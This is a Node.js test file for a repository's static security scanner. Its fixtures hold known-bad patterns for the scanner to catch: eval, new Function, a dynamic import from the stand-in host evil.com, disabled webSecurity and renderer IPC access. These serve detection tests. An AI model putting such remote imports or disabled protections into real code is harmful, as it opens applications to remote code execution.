/**
 * Tests for the static security scan (Phase 26).
 *
 * A scanner that has never been shown a violation is a scanner nobody can trust
 * to have found one. Each test writes a temporary file containing a known-bad
 * pattern and asserts the scanner reports it, so "the scan passed" means
 * something.
 */
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import path from "node:path";
import assert from "node:assert/strict";
import test from "node:test";

const { scan, walk, ROOT } = await import(
  new URL("../../scripts/security-scan.mjs", import.meta.url).href
);

/**
 * Fixtures live *inside* the repository, not in the OS temp dir, because the
 * scanner's review rules key off `path.relative(ROOT, file)` — a fixture outside
 * the root would have no meaningful path and every allowlist test would pass for
 * the wrong reason.
 */
const dir = path.join(ROOT, ".scan-fixtures");
test.after(() => rmSync(dir, { recursive: true, force: true }));

/**
 * Write a fixture at a path the scanner will resolve relative to `dir`, so the
 * path allowlist rules behave exactly as they do for real source files.
 */
function write(relative, contents) {
  const full = path.join(dir, relative);
  mkdirSync(path.dirname(full), { recursive: true });
  writeFileSync(full, contents, "utf-8");
  return full;
}

const scanFixtures = (files) => scan(files, { base: dir });

test("scan: a clean file produces nothing", () => {
  const file = write("clean.ts", "export const add = (a: number, b: number): number => a + b;\n");
  const result = scanFixtures([file]);
  assert.deepEqual(result.banned, []);
  assert.deepEqual(result.review, []);
});

test("scan: eval and new Function are banned", () => {
  const file = write("banned.ts", "const x = eval('1+1');\nconst y = new Function('return 2')();\n");
  const result = scanFixtures([file]);
  const ids = result.banned.map((hit) => hit.id);
  assert.ok(ids.includes("eval"), "eval must be reported");
  assert.ok(ids.includes("new-function"), "new Function must be reported");
});

test("scan: a comment mentioning a banned pattern is not a hit", () => {
  // Otherwise the scanner spends its whole budget reporting the documentation
  // that explains what it forbids, and nobody reads the output.
  const file = write(
    "commented.ts",
    "// we never call eval() here\n/* nor new Function( */\nexport const ok = 1;\n",
  );
  const result = scanFixtures([file]);
  assert.deepEqual(result.banned, []);
});

test("scan: a remote script and a remote dynamic import are banned", () => {
  const file = write(
    "remote.ts",
    'const s = document.createElement("script");\nconst m = await import("https://evil.com/x.js");\n',
  );
  const ids = scanFixtures([file]).banned.map((hit) => hit.id);
  assert.ok(ids.includes("remote-script"));
  assert.ok(ids.includes("remote-module"));
});

test("scan: review-required patterns are reported, not fatal", () => {
  const file = write("review.ts", "export const w = 1;\nconst bad = { webSecurity: false };\n");
  const result = scanFixtures([file]);
  assert.deepEqual(result.banned, [], "review rules must not fail the run");
  assert.equal(result.review.length, 1);
  assert.equal(result.review[0].id, "web-security-off");
});

test("scan: review rules respect their path allowlist", () => {
  // `ipcRenderer` is legitimate in the preload and a bug in the renderer.
  const preload = write("src/preload/x.ts", "ipcRenderer.invoke('X');\n");
  assert.deepEqual(scanFixtures([preload]).review, [], "preload is on the ipc allowlist");

  const renderer = write("src/renderer/x.ts", "ipcRenderer.invoke('X');\n");
  assert.equal(scanFixtures([renderer]).review.length, 1, "renderer must be flagged");
});

test("scan: a security-review annotation is recorded and does not hide a banned hit", () => {
  const ok = write("waived.ts", "// security-review: needed for the sandbox probe\nconst x = 1;\n");
  const okResult = scanFixtures([ok]);
  assert.equal(okResult.waivers.length, 1);
  assert.match(okResult.waivers[0].reason, /sandbox probe/);

  // A waiver must never suppress a BANNED pattern; those are not waivable.
  const bad = write("waived-bad.ts", "eval('1'); // security-review: please ignore\n");
  const badResult = scanFixtures([bad]);
  assert.equal(badResult.banned.length, 1, "a waiver must not hide a banned pattern");
});

test("scan: token access is always flagged", () => {
  const file = write("token.ts", "export const getToken = (): string => 'x';\n");
  const ids = scanFixtures([file]).review.map((hit) => hit.id);
  assert.ok(ids.includes("token-access"));
});

test("scan: the real repository has no banned patterns", () => {
  // The end-to-end assertion: this is the check CI actually runs.
  const files = ["src", "scripts"].flatMap((d) => walk(path.join(ROOT, d), []));
  assert.ok(files.length > 10, "walk() found almost nothing — the scan is broken");
  const result = scan(files);
  assert.deepEqual(
    result.banned.map((hit) => `${hit.file}:${hit.line} [${hit.id}]`),
    [],
    "the repository must be free of banned patterns",
  );
  assert.deepEqual(
    result.review.map((hit) => `${hit.file}:${hit.line} [${hit.id}]`),
    [],
    "the repository must be free of un-waived review patterns",
  );
});
